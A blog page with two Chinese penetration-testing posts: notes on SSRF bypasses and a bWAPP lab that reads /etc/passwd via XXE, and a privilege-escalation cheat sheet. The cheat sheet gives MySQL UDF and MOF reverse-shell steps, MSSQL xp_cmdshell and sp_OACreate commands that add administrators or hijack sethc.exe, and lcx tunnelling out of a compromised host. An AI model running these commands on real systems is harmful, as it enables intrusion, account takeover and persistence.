<h5 id="SSRF常见出现位置"><a href="#SSRF常见出现位置" class="headerlink" title="SSRF常见出现位置"></a>SSRF常见出现位置</h5><ul>
<li>分享：通过URL地址分享网页内容</li>
<li>转码服务</li>
<li>在线翻译</li>
<li>图片加载与下载：通过URL地址加载或下载图片</li>
<li>图片、文章收藏功能</li>
<li>未公开API实现以及其他调用URL的功能</li>
</ul>
<h5 id="SSRF验证方法"><a href="#SSRF验证方法" class="headerlink" title="SSRF验证方法"></a>SSRF验证方法</h5><p>1.因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞</p>
<p>2.在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p>
<h5 id="利用SSRF漏洞"><a href="#利用SSRF漏洞" class="headerlink" title="利用SSRF漏洞"></a>利用SSRF漏洞</h5><ol>
<li>让服务器去访问相应的网址</li>
<li>让服务器去访问自己所处内网的一些指纹文件来判断是否存在相应的CMS</li>
<li>可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</li>
</ol>
<ul>
<li><p>file协议</p>
<p>​    查看文件：file:///etc/passwd</p>
</li>
<li><p>dict协议</p>
<p>​    探测端口：dict://127.0.0.1:80</p>
</li>
<li><p>gopher协议</p>
<p>​    Gopher协议可以做很多，特别是在SSRF漏洞中可以发挥很多重要的作用，利用此协议可以攻击内网的FTP、Telnet Redis Memcache 也可以进行GET POST请求 .</p>
</li>
</ul>
<ol>
<li>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包）</li>
<li>攻击内网应用程序（利用跨协议通信技术）</li>
<li>DOS攻击</li>
<li>判断内网主机是否存活：访问是否有端口开放</li>
</ol>
<h5 id="常见的绕过方法"><a href="#常见的绕过方法" class="headerlink" title="常见的绕过方法"></a>常见的绕过方法</h5><ul>
<li><p>@绕过：<code>http://xxx.com@10.10.10.10=10.10.10.10</code></p>
</li>
<li><p>利用特殊的域名</p>
</li>
<li><p>利用句号</p>
<p>127。0。0。1=&gt;127.0.0.1</p>
</li>
<li><p>利用协议</p>
</li>
<li><p>利用Enclosed </p>
</li>
<li><p>IP使用其他进制：127.0.0.1=2130706433</p>
</li>
<li><p>使用短地址：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> ==<a href="https://dwz.lc/2fGYWaE" target="_blank" rel="noopener">https://dwz.lc/2fGYWaE</a></p>
</li>
</ul>
<h5 id=""><a href="#" class="headerlink" title=""></a><img src="QQ%E6%88%AA%E5%9B%BE20200212110340.png" alt=""></h5><h4 id="bWAPP靶场实战（SSRF"><a href="#bWAPP靶场实战（SSRF" class="headerlink" title="bWAPP靶场实战（SSRF)"></a>bWAPP靶场实战（SSRF)</h4><h5 id="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"><a href="#一、使用（RFI）远程文件包含进行端口扫描（内网探测）" class="headerlink" title="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"></a>一、使用（RFI）远程文件包含进行端口扫描（内网探测）</h5><p>我们进入bWAPP  SSRF部分。</p>
<img src="QQ截图20200128162933.png" style="zoom:50%;" />





<p>我们点击黑体字Port scan得到了端口扫描的攻击脚本</p>
<img src="QQ截图20200128163234.png" style="zoom:50%;" />



<p>我们退出SSRF模块 进入（RFI/LFI)模块，发现?language=lang_en.php此处可能存在文件包含漏洞。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128163521.png" alt=""></p>
<p>我们在VM中开启了虚拟机，得知IP为192.168.153.131</p>
<img src="QQ截图20200128164256.png" style="zoom:50%;" />



<h5 id="二、使用XXE获取敏感文件中的内容"><a href="#二、使用XXE获取敏感文件中的内容" class="headerlink" title="二、使用XXE获取敏感文件中的内容"></a>二、使用XXE获取敏感文件中的内容</h5><p>我们先点击黑体字获取XXE攻击脚本。</p>
<img src="QQ截图20200128170206.png" style="zoom:67%;" />

<p><img src="QQ%E6%88%AA%E5%9B%BE20200128170255.png" alt=""></p>
<p> 然后使用Burp抓包后发送到Repeater模块，</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128171953.png" alt=""></p>
<p> 第一次我们使用http协议读取robots.txt文件内容</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128175808.png" alt=""></p>
<p>第二次我们使用php协议读取 xml页面中的内容</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128175940.png" alt=""></p>
<p>第三次我们使用file协议读取本机的/etc/passwd的内容</p>
<img src="QQ截图20200128180043.png" style="zoom:67%;" />


          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/ti-quan-fang-shi-zong-jie/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/ti-quan-fang-shi-zong-jie/" itemprop="url">提权方式总结</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T13:30:39+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="提权方式总结"><a href="#提权方式总结" class="headerlink" title="提权方式总结"></a>提权方式总结</h2><h4 id="1-什么是提权"><a href="#1-什么是提权" class="headerlink" title="1.什么是提权"></a>1.什么是提权</h4><p>提权就是通过各种办法和漏洞，提高自己在服务器中的权限，以便控制全局。</p>
<p>Windows：User &gt;&gt; System<br>Linux：User &gt;&gt; Root</p>
<h4 id="2-提权的方式"><a href="#2-提权的方式" class="headerlink" title="2.提权的方式"></a>2.提权的方式</h4><p>1.、系统漏洞提权（Linux、Windows）</p>
<p>2、数据库提权</p>
<p>3、系统配置错误提权</p>
<p>4、权限继承类提权</p>
<p>5、第三方软件/服务提权</p>
<p>6、WebServer漏洞提权</p>
<h4 id="1-系统漏洞提权"><a href="#1-系统漏洞提权" class="headerlink" title="1.系统漏洞提权"></a>1.系统漏洞提权</h4><p>系统漏洞提权一般就是利用系统自身缺陷，用来提升权限。为了使用方便，windows和linux系统均有提权用的可执行文件。</p>
<p>Windows的提权exp一般格式为MS08067.exe；<br>Linux的提权exp一般格式为2.6.18-194或2.6.18.c。</p>
<h5 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h5><ul>
<li>漏洞编号命名格式</li>
</ul>
<p>Windows系统漏洞编号命名格式为：MS08067</p>
<p>其中：MS是Micosoft的缩写，固定格式；08 表示年份，即2008年发布的漏洞；067 表示顺序，即当年度发布的第67个漏洞。</p>
<ul>
<li>使用exp提权</li>
</ul>
<p>在日常渗透测试过程中，我们常常会先是拿到webshell再进行提权。所以提权脚本也常常会被在webshell中运行使用。</p>
<p>那么我们如何知道使用哪个exp来提权呢？</p>
<p>我们可以使用systeminfo命令或者查看补丁目录，查看补丁记录，来判断有哪个补丁没打，然后使用相对应的exp进行提权。</p>
<p><strong>TIPS：</strong></p>
<p>1.渗透过程中经常会遇到管理员禁止了cmd.exe的使用，我们该怎么办？进止了exe文件的上传怎么办？<br> 2.管理员禁止了一些脚本函数的运行，看不到回显怎么办？<br> 3.在使用webshell提权的时候要特别注意：<br> asp的webshell要支持：<br> wscript(wscript.shell/shell.application)<br> aspx能调用.net组件来执行cmd的命令<br> /c whoami</p>
<h5 id="linux系统提权"><a href="#linux系统提权" class="headerlink" title="linux系统提权"></a>linux系统提权</h5><p>Linux系统漏洞的exp一般按照内核版本来命名：2.6.18-194或2.6.18.c</p>
<p>形如2.6.18-194，可以直接执行；形如2.6.18.c，需要编译后运行，提权。当然也有少部分exp是按照发行版版本命名。</p>
<p>使用exp</p>
<p>一般情况下linux的本地提权要用nc反弹出来，因为Linux下提升权限后得到的是交互式shell，需反弹才能进行下一步命令的执行。<br>我们可以使用uname -a命令或者cat /proc/version，来判断系统的内核情况等等，然后使用相对应的exp进行提权。<br>注：</p>
<p>提权过程中需要为你的提权exp赋权，chmod。<br>linux服务器很多情况下管理员会设置目录权限，我们无法修改，但是一般/tmp/目录不会被设置权限，这和windows下的tmp和回收站是一个道理，所以我们可以将exp存放到/tmp目录下。</p>
<h4 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h4><p>数据库提权是指：通过执行数据库语句、数据库函数等方式提升服务器用户的权限。</p>
<p>首先我们要先有能力登入数据库，所以通常我们拿到webshell之后要去网站目录去找数据库连接文件，常在形如xxx.conf或conf.xxx文件中。</p>
<h5 id="MySQL数据库提权"><a href="#MySQL数据库提权" class="headerlink" title="MySQL数据库提权"></a>MySQL数据库提权</h5><p>MySQL数据库一般是使用udf（用户自定义函数）提权或mof（托管对象格式）提权。</p>
<ul>
<li>udf提权（用户自定义函数）</li>
</ul>
<p><strong>条件：</strong><br>1、系统版本（Windows2000，XP,Win2003)；<br>2、拥有MYSQL的某个账号，且该账号具有对msql的insert与delete权限；<br>3、具有root账号密码。</p>
<p><strong>使用方法：</strong><br>1、获取当前mysql的一个数据库连接信息，通常包含地址、端口、账号、密码、库名等五个信息。<br>2、把udf专用的webshell传到服务器上，访问并进行数据库连接。<br>3、连接成功后，导出DLL文件。</p>
<p><strong>注：</strong></p>
<ul>
<li>Mysql&lt;5.0，导出路径随意;</li>
<li>5.0&lt;=mysql&lt;5.1，则需要导出至目标服务器的系统目录（如：system32），否则在下一步操作中你会看到“No paths allowed for shared library”错误；</li>
<li>mysql&gt;5.1，需要导出dll到插件路径，例如：D:\Program Files\MySQL\MySQL Server 5.1.3\lib\plugin<br>若mysql&gt;=5.0，语句中的DLL不允许带全路径，如果在第二步中已将DLL导出到系统目录，那么你就可以省略路径而使命令正常执行，否则将会看到”Can’t open shared library“错误。</li>
<li>如果提示“Function ‘cmdshell’ already exists”，则输入下列语句可以解决：drop function cmdshell;</li>
</ul>
<p><strong>使用SQL语句创建自定义函数。语法如下：</strong></p>
<p><code>Create Function 函数名 returns string soname &#39;导出的DLL路径&#39;;
eg: Create Function cmdshell returns string soname &#39;udf.dll&#39;;</code></p>
<p><strong>功能函数说明：</strong></p>
<ul>
<li>cmdshell 执行cmd;</li>
<li>downloader 下载者,到网上下载指定文件并保存到指定目录;</li>
<li>open3389 通用开3389终端服务,可指定端口(不改端口无需重启);</li>
<li>backshell 反弹Shell;</li>
<li>ProcessView 枚举系统进程;</li>
<li>KillProcess 终止指定进程;</li>
<li>regread 读注册表;</li>
<li>regwrite 写注册表;</li>
<li>shut 关机,注销,重启;</li>
<li>about 说明与帮助函数;</li>
</ul>
<p><strong>创建函数成功后，就可以通过sql语句调用它了。</strong></p>
<p>语法如下：<br>select 创建的函数名 (‘参数列表’);<br>eg: select cmdshell(“net user nsfocus Nsf0cus /add”)；创建一个用户nsfocus，密码为Nsf0cus</p>
<p><strong>函数使用完后，我们需要把之前生成的DLL和创建的函数删除掉，但要注意次序，必须先删除函数再删除DLL。</strong></p>
<p>删除函数的语法如下：<br>drop function 创建的函数名;<br>eg: drop function cmdshell;</p>
<h5 id="整体思路："><a href="#整体思路：" class="headerlink" title="整体思路："></a>整体思路：</h5><ul>
<li>导出C:\windows\udf.dll</li>
<li>Create Function cmdshell returns string soname ‘udf.dll’;</li>
<li>select cmdshell(‘whoami’)</li>
<li>drop function cmdshell</li>
</ul>
<h5 id="Mof提权（托管对象格式）"><a href="#Mof提权（托管对象格式）" class="headerlink" title="Mof提权（托管对象格式）"></a>Mof提权（托管对象格式）</h5><p>提权c:/windows/system32/wbem/mof/</p>
<pre><code>- use exploit/windows/mysql/mysql_mof
- set password xxx
- set username xxx
- set rhost xxx
- set rport xxx
- set payload windows/shell_reverse_tcp
- set lhost xxx
- set lport xxx
- exploit</code></pre><h5 id="Mssql数据库提权"><a href="#Mssql数据库提权" class="headerlink" title="Mssql数据库提权"></a>Mssql数据库提权</h5><p><img src="https://img-blog.csdnimg.cn/20190611101318911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p>
<p><strong>在SA权限下</strong></p>
<p>1.存在xp_cmdshell时<br>使用xp_cmdshell执行命令添加用户，当出现错误可以恢复和开启xp_cmdshell</p>
<p>2.xp_cmdshell无法使用时<br>    使用sp_OACreate执行命令，同样当出现错误可以恢复和开启</p>
<ol start="3">
<li><p>当执行命令无法使用时可以用沙盒提权 (使用xp_regwrite和openrowset)</p>
</li>
<li><p>当只有xp_regwrite可用时可以劫持粘滞键（sethc.exe)<br>使用xp_regwrite修改注册表</p>
</li>
</ol>
<p><strong>DBA权限下</strong></p>
<ol>
<li>备份到网站目录</li>
<li>通过备份文件到启动项提权</li>
</ol>
<h5 id="SA口令获取方法"><a href="#SA口令获取方法" class="headerlink" title="SA口令获取方法"></a>SA口令获取方法</h5><ul>
<li><strong>Webshell或源码获取</strong></li>
</ul>
<p>一般在网站的配置文件中有存放明文账号密码，常用配置文件名如：</p>
<pre><code>conn.aspx
config.aspx
config.php
web.config
.........

一般格式如：

server=localhost;
UID=sa;
PWD=shadowflow</code></pre><ul>
<li><strong>源代码泄露</strong></li>
</ul>
<p>网站源码泄露情况主要以程序员上传代码到git等开源平台或更新代码时未删除备份文件(.svn、.git、.bak），以及运维人员打包源代码到网站服务器(<a href="http://www.rar/" target="_blank" rel="noopener">www.rar</a>等）。</p>
<ul>
<li><strong>嗅探</strong></li>
</ul>
<p>在局域网中使用cain等工具进行arp嗅探的时候可以抓取到1433端口的数据库明文登录密码</p>
<ul>
<li><strong>口令暴力破解</strong></li>
</ul>
<p>利用mssql暴力破解工具对mssql进行暴力破解，一旦成功将获得sa相应权限</p>
<p><strong>常用SQL Server提权语句</strong></p>
<pre><code>查看数据库版本：select @@version

查看数据库系统参数：exec master..xp_msver;

查看用户所属角色信息：sp_helpsrvrolemember

查看当前数据库：select db_name()

显示机器上的驱动器：xp_availablemedia

查看当前账户权限

select IS_SRVROLEMEMBER(&#39;sysadmin&#39;) #判断是否为sa权限

类似serveradmin,setupadmin,securityadmin,diskadmin,bulkadmin

select IS_MEMBER(&#39;db_owner&#39;) #判断是否为dbo权限

添加用户

exec master.dbo.sp_addlogin test,password #添加用户

exec master.dbo.sp_addsrvrolemember test,sysadmin #加权限

启动停止服务

exec master..xp_servicecontrol &#39;stop&#39;,&#39;test&#39;

exec master..xp_servicecontrol &#39;start&#39;,&#39;test&#39;

检查功能

SELECT count(*）FROM master.dbo.sysobjects WHERE name=&#39;xp_cmdshell&#39;

xp_cmdshell, xpregread,sp_makewebtask,xp_subdirs,xp_dirtree, sp_addextendedproc
</code></pre><p><strong>xp_cmdshell</strong></p>
<pre><code>1、开启xp_cmdshell存储过程

exec sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;
exec sp_configure &#39;xp_cmdshell&#39;,1;RECONFIGURE;

2、关闭xp_cmdshell存储过程

exec sp_configure &#39;show advanced options&#39;, 1, RECONFIGURE;
exec sp_configure &#39;xp_cmdshell&#39;,0;RECONFIGURE;

3、xp_cmdshell执行命令

exec master..xp_cmdshell &#39;ver&#39;
exec master.dbo.xp_cmdshell &#39;net localgroup administrators test /add&#39;

4、恢复xp_cmdshell

exec sp_dropextendedproc &#39;xp_cmdshell&#39;

dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;xplog70.dll) OR dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;d:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&quot;);EXEC sp_configure &#39;show advanced options&#39;, 0 --
</code></pre><p><strong>sp_OACreate</strong></p>
<pre><code>1、开启sp_OACreate
exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;
exec sp_configure &#39;Ola Automation Procedures&#39; , 1;RECONFIGURE;

2、关闭sp_OACreate
exec sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;
exec sp_configure &#39;Ole Automation Procedures&#39;,0;RECONFIGURE;

3、禁用advanced options
EXEC sp_configure &#39;show advanced options&#39;,0;GO RECONFIGURE;

4、sp_OACreate执行命令

DECLARE @js int
EXEC sp_OACreate &#39;ScriptControl&#39;,@js OUT
EXEC sp_OASetProperty @js,&#39;Language&#39;,&#39;JavaScript&#39;
ActiveXObject(&quot;Shell.Users&quot;);z=o.create(&quot;user&quot;);z.changePassword(&quot;pass&quot;,&quot;&quot;);z.setting(&quot;AccountType&quot;)=3;&#39;

5、sp_OACreate移动文件
declare @aa int
exec sp_oacreate &#39;scripting.filesystemobject&#39; @aa out
exec sp_oamethod @aa, &#39;moveFile&#39;,null,&#39;c:\temp\ipmi.log&#39;,&#39;c:\temp\ipmi1.log&#39;;

6、sp_OACreate复制文件

declare @o int

exec sp_oacreate &#39;scripting.filesystemobject&#39;, @o out

exec sp_oamethod @o,&#39;copyfile&#39;,null,&#39;c:\windows\explorer.exe&#39;,&#39;c:\windows\system32\sethc.exe&#39;;

7、sp_OACreate删除文件

DECLARE @Result int

DECLARE @FSO_Token int

EXEC @Result = sp_OACreate &#39;Scripting.FileSystemObject&#39;, @FSO_Token OUTPUT

EXEC @Result = sp_OAMethod @FSO_Token, &#39;DeleteFile&#39;,NULL,&#39;c:\Documents and Settings\All Users\ [开始] 菜单\程序\启动\user.bat&#39;

EXEC @Result = sp_OADestrop @FSO_Token

8、wscript.shell执行命令

9、Shell.Application执行命令

10、sp_oacreate 替换粘贴键
</code></pre><p><strong>沙盒执行命令</strong></p>
<p>openrowset开启</p>
<p>openrowset关闭</p>
<p>沙盒执行命令</p>
<p><strong>注册表篡改</strong></p>
<p>注册表劫持粘贴键</p>
<h4 id="系统配置不当提权"><a href="#系统配置不当提权" class="headerlink" title="系统配置不当提权"></a>系统配置不当提权</h4><p>利用配置不当提权</p>
<ul>
<li>前提：已经成功渗透进目标系统；</li>
<li>相比利用漏洞提权，是更常用的方法；</li>
<li>在大部分企业中，会将系统的漏洞即时进行补丁更新，难以通过系统自身我的漏洞进行入侵；</li>
<li>可以查找系统中以system权限启动的服务或应用，可以尝试将其替换或者反弹shell的方式提权；</li>
<li>可以查找NTFS权限允许users修改删除的应用，利用配置不当进行提权；</li>
<li>代码中是否有过滤参数的操作等都可以加以利用，进行提取</li>
</ul>
<h4 id="权限继承类提权"><a href="#权限继承类提权" class="headerlink" title="权限继承类提权"></a>权限继承类提权</h4><p><strong>开机启动项提权？</strong><br>windows开机时候都会有一些开机启动的程序，那时候启动的程序权限都是system，因为是system把他们启动的，利用这点，我们可以将自动化脚本写入启动项，达到提权的目的。</p>
<h4 id="第三方软件-服务提权"><a href="#第三方软件-服务提权" class="headerlink" title="第三方软件/服务提权"></a>第三方软件/服务提权</h4><h4 id="WebServer漏洞提权"><a href="#WebServer漏洞提权" class="headerlink" title="WebServer漏洞提权"></a>WebServer漏洞提权</h4><h4 id="提权中常见的问题"><a href="#提权中常见的问题" class="headerlink" title="提权中常见的问题"></a>提权中常见的问题</h4><p>cmd无法执行</p>
<ul>
<li><p>cmd被删除</p>
<ul>
<li>绕过思路：找可读可写目录，上传cmd.exe</li>
</ul>
</li>
<li><p>cmd被降权</p>
<ul>
<li>绕过思路：找可读可写目录，上传cmd.exe</li>
</ul>
</li>
<li><p>组件被删除</p>
<ul>
<li>切换组件</li>
</ul>
</li>
<li><p>防护软件拦截</p>
<ul>
<li>很难绕过</li>
</ul>
</li>
<li><p>3389无法连接</p>
</li>
<li><p>端口被修改</p>
<ul>
<li>找端口（1-65535），使用端口扫描工具、注册表读取、查询PID</li>
</ul>
</li>
<li><p>端口被关闭</p>
<ul>
<li>上传3389打开工具到可读可写目录，需要先提权，调用执行exe工具</li>
</ul>
</li>
<li><p>内网环境</p>
<ul>
<li>端口转发：<ol>
<li>外网服务器：lcx.exe -listen 1234 4321 (监听1234端口的流量并将其转发至本地4321端口)</li>
<li>内网肉鸡：lcx.exe -slave 121.43.99.73 1234 192.168.1.106 1111 (将本地192.168.1.106的1111端口流量转发至121.43.99.73的1234端口上)</li>
<li>外网 连接本地端口4321 即代表连接肉鸡的1111端口</li>
</ol>
</li>
</ul>
</li>
<li><p>防护软件拦截</p>
<ul>
<li>很困难</li>
</ul>
</li>
</ul>
<h3 id="提权辅助工具"><a href="#提权辅助工具" class="headerlink" title="提权辅助工具"></a>提权辅助工具</h3><h5 id="1-Linux提权辅助工具"><a href="#1-Linux提权辅助工具" class="headerlink" title="1.Linux提权辅助工具"></a>1.Linux提权辅助工具</h5><p>Linux_Exploit_Suggester是一款根据操作系统版本号自动查找相应提权脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p>
<p>github项目地址：</p>
<pre><code>https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</code></pre><p> 用法示例：</p>
<pre><code>$ perl ./Linux_Exploit_Suggester.pl -k 2.6.28</code></pre><h5 id="2-Windows提权辅助工具"><a href="#2-Windows提权辅助工具" class="headerlink" title="2.Windows提权辅助工具"></a>2.Windows提权辅助工具</h5><p>Windows-Exploit-Suggester是受Linux_Exploit_Suggester的启发而开发的一款提权辅助工具，用python开发而成，通过比对systeminfo生成的文件，从而发现系统是否存在未修复漏洞。</p>
<p>github项目地址：</p>
<pre><code>https://github.com/AonCyberLabs/Windows-Exploit-Suggester</code></pre><p>用法示例：</p>
<pre><code>#查看系统可能存在的漏洞
$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext &#39;windows server 2008 r2&#39;</code></pre><h5 id="3-gfto"><a href="#3-gfto" class="headerlink" title="3.gfto"></a>3.gfto</h5><p>gtfo是一个纯粹用python3编写的工具，用于搜索GTFOBins和LOLBAS上的二进制文件。</p>
<p>github项目地址： </p>
<pre><code>https://github.com/mzfr/gtfo</code></pre><p>很明显，从以上描述里，我们知道这款工具并不是主角，需要重点关注的是GTFOBins和LOLBAS。</p>
<p>GTFOBins：Linux命令提权辅助查询.</p>
<h5 id="4-Beroot"><a href="#4-Beroot" class="headerlink" title="4.Beroot"></a>4.Beroot</h5><p>BeRoot Project是一个利用后的工具，可以检查常见的错误配置，以找到提升我们特权的方法，该项目可在Windows，Linux和Mac OS上运行。</p>
<p>github项目地址：</p>
<pre><code>https://github.com/AlessandroZ/BeRoot</code></pre><h5 id="5-Vulmap"><a href="#5-Vulmap" class="headerlink" title="5.Vulmap"></a>5.Vulmap</h5><p>Vulmap是一个开源的在线本地漏洞扫描程序项目。它由适用于Windows和Linux操作系统的联机本地漏洞扫描程序组成。</p>
<p>Github项目地址：</p>
<pre><code>https://github.com/vulmon/Vulmap</code></pre><h5 id="6-WindowsVulnScan"><a href="#6-WindowsVulnScan" class="headerlink" title="6.WindowsVulnScan"></a>6.WindowsVulnScan</h5><p>这是一款基于主机的漏洞扫描工具，查看查找主机上具有的CVE和具有公开EXP的CVE。</p>
<p>github项目地址：</p>
<pre><code>https://github.com/chroblert/WindowsVulnScan</code></pre><h5 id="7、ATRoot-Auxiliary-v2-0"><a href="#7、ATRoot-Auxiliary-v2-0" class="headerlink" title="7、ATRoot Auxiliary v2.0"></a>7、ATRoot Auxiliary v2.0</h5><p>基于java开发的提权辅助工具，支持双端加载，本地模式配置文件存放于本地软件目录下的conf目录；远程模式则可以更新配置文件</p>
<h5 id="8、在线提权漏洞检测平台"><a href="#8、在线提权漏洞检测平台" class="headerlink" title="8、在线提权漏洞检测平台"></a>8、在线提权漏洞检测平台</h5><p>一款为主流 Linux/Unix 和 Windows 系统提供精准且高效的操作系统脆弱性漏洞检测的专业化平台，基于其强大的安全检测能力，能够给出专业的修复建议，有效验证和加固网络资产漏洞。</p>
<p>在线查询地址：</p>
<pre><code>https://detect.secwx.com/</code></pre><h5 id="9-提权辅助网页"><a href="#9-提权辅助网页" class="headerlink" title="9.提权辅助网页"></a>9.提权辅助网页</h5><p>在Windows提权的时候，对比补丁找Exp很烦吧？老是忘记一些提权命令跟工具的语法很苦逼吧？没事，有了这款工具什么问题都解决~</p>
<p>在线查询地址：</p>
<pre><code>http://bugs.hacking8.com/tiquan/</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Shu1L</p>
              <p class="site-description motion-element" itemprop="description">欢迎来到Shu1L的神秘小屋！</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">32</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Shu1L</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
